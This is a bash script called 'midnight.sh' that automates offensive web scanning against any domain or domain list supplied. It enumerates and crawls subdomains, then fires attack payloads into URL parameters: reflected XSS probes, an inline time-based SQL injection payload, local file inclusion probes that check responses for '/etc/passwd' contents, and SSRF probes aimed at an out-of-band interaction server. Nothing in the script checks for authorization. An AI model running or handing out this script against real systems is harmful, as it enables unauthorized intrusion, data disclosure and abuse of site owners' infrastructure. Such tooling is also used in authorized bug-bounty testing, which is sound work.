#!/bin/bash



echo '    __  ____     __      _       __    __     ';
echo '   /  |/  (_)___/ /___  (_)___  / /_  / /_    ';
echo '  / /|_/ / / __  / __ \/ / __ \/ __ \/ __/    ';
echo ' / /  / / / /_/ / / / / / /_/ / / / / /_      ';
echo '/_/  /_/_/\__,_/_/ /_/_/\__, /_/ /_/\__/      ';
echo '                        /___/                 ';

while getopts ":d:l:" flag; do

  case "${flag}" in

    d)

      # Single domain mode

      target=${OPTARG}

      ;;

    l)

      # List mode

      targetslist=${OPTARG}

      ;;

    *)

      echo "Usage: ./midnight.sh [-d domain.com] [-l domainlist.txt]"

      exit 1

      ;;

  esac

done

if [ -z "$target" ] && [ -z "$targetslist" ]; then

  echo "You must provide either the -d or -l option with a valid argument."

  echo "Usage: ./midnight.sh [-d domain.com] [-l domainlist.txt]"

  exit 1

fi

echo "[+] Performing subdomain enumeration"

if [ -n "$target" ] ; then

    subfinder -d "$target" -silent -o subdomains.txt

fi

if [ -n "$targetslist" ] ; then

    subfinder -dL "$targetslist" -silent -o subdomains.txt

fi

sort -u subdomains.txt -o subdomains.txt

echo "[+] Analysing and crawling targets"

cat subdomains.txt | httpx -mc 200 -o 200subs.txt

katana -d 10 -list 200subs.txt -jc -aff -fs rdn -o 200crawl.txt

cat 200crawl.txt >> archive_links

echo "[+] Running gau"

cat subdomains.txt | gau >> archive_links

echo "[+] Organising assets and removing duplicates"

sort -u archive_links | uro | tee -a final_links

rm subdomains.txt 200subs.txt 200crawl.txt archive_links

echo "[+] Testing for xss"

while IFS= read -r payload ; do

        while IFS= read -r domain ; do

                url_check=$(echo "$domain" | grep "=")

                        if [ -n "$url_check" ] ; then

                        url=$(echo "$url_check" | qsreplace "$payload")

                        echo "Testing $url"

                        resp=$(curl -s "$url")

                                if [[ $? -ne 0 ]] ; then

                                continue

                                fi

                                check_result=$(echo "$resp" | grep -q "$payload")

                                        if [[ $? -eq 0 ]] ; then

                                        echo -e "Possible XSS found: $url" | notify

                                        fi

                        fi

        done < final_links

done < xsspayloads.txt

echo "[+] Testing for SQLi"

cat final_links | grep "=" | qsreplace '0"XOR(if(now()=sysdate(),sleep(12),0))XOR”Z' | httpx -mrt '>10' -o sqli_findings.txt

if [ -s "sqli_findings.txt" ] ; then

    echo 'Possible SQL injections:' | notify

    cat sqli_findings.txt | notify

fi

rm sqli_findings.txt

echo "[+] Testing for LFI"

while IFS= read -r lfi ; do

    while IFS= read -r domain ; do

        url_check=$( echo "$domain" | grep "=" )

        if [ -n "$url_check" ] ; then

                url=$(echo "$url_check" | qsreplace "$lfi")

        echo "Testing $url"

        resp=$(curl -s "$url")

        if [[ $? -ne 0 ]] ; then

            continue

        fi

        check_result=$(echo "$resp" | grep -q "root:x")

        if [[ $? -eq 0 ]] ; then

            echo -e "Possible LFI found: $url" | notify

        fi

        fi

    done < final_links

done < LFIpayloads.txt

echo "[+] Testing for SSRF"

interactsh-client > serverinfo.txt &

server_name=$(cat serverinfo.txt | head -n 12 | tail -n 1 | sed 's/^\[[^]]*\] //')

server_address="http:$server_name"

cat final_links | grep "=" | qsreplace "$server_address" | httpx

results_check=$(cat serverinfo.txt | wc -l)

if [ "$results_check" -gt 12 ] ; then

    echo 'SSRF Server Logs' | notify

    cat serverinfo.txt | notify

    rm serverinfo.txt

else

    rm serverinfo.txt

fi

rm final_links

echo "[+] Midnight is done" | notify
